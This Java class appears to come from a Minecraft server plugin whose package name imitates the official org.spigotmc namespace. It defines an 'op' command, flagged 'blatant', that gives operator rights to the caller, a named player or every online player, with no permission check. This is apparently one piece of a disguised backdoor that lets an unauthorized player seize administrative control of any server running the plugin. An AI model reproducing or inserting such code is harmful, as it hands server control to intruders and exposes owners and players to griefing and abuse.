package org.spigotmc.commands.impl.player;

import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.spigotmc.Main;

@CommandInfo(
    name = "op",
    usage = "op <player>",
    desc = "Sets you and others op!",
    blatant = true
)
public class Op extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.setOp(true);
            p.sendMessage(Settings.PREFIX("You are now op!"));
        } else if (args.length <= 2 && args[1].equals("*")) {
            for (Player player : Bukkit.getOnlinePlayers()) {
                player.setOp(true);
                p.sendMessage(Settings.PREFIX("Everyone is now op!!"));
            }
        } else if (args.length <= 2) {
            @SuppressWarnings("deprecation")
            Player target = Bukkit.getPlayer(args[1]);
            if (target != null) {
                target.setOp(true);
                p.sendMessage(Settings.PREFIX("Op given to " + target.getName() + "!"));
            } else {
                p.sendMessage("Player not found!");
            }
        } else {
            p.sendMessage(Settings.USAGE(Op.class.getAnnotation(CommandInfo.class).usage()));
        }
    } 
}
